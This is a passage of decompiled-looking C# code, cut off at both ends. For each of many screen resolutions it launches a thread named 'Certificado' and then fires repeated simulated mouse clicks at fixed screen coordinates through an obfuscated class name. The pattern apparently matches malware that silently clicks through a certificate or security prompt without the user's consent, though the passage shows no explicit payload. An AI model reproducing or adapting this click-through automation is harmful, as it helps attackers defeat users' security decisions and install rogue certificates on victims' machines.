        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1280 && height == 1024)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 726;
        int Y = 715;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1280 && height == 960)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 725;
        int Y = 686;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1280 && height == 800)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 724;
        int Y = 606;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1280 && height == 768)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 736;
        int Y = 588;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1280 && height == 720)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 730;
        int Y = 567;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1280 && height == 600)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 730;
        int Y = 502;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1152 && height == 864)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 666;
        int Y = 638;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1024 && height == 768)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 600;
        int Y = 589;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width != 800 || height != 600)
        return;
      new Thread(new ThreadStart(this.Certificado)).Start();
      Thread.Sleep(300);
      int X1 = 490;
      int Y1 = 504;
      APRECO518NECROLOGISTA.SetCursorPos(X1, Y1);
      APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.SetCursorPos(X1, Y1);
      APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.SetCursorPos(X1, Y1);
      APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.SetCursorPos(X1, Y1);
      APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      Thread.Sleep(100);
      APRECO518NECROLOGISTA.SetCursorPos(X1, Y1);
      APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.SetCursorPos(X1, Y1);
      APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.SetCursorPos(X1, Y1);
      APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.SetCursorPos(X1, Y1);
      APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      Thread.Sleep(100);
      APRECO518NECROLOGISTA.SetCursorPos(X1, Y1);
      APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      APRECO518NECROLOGISTA.SetCursorPos(X1, Y1);
      APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
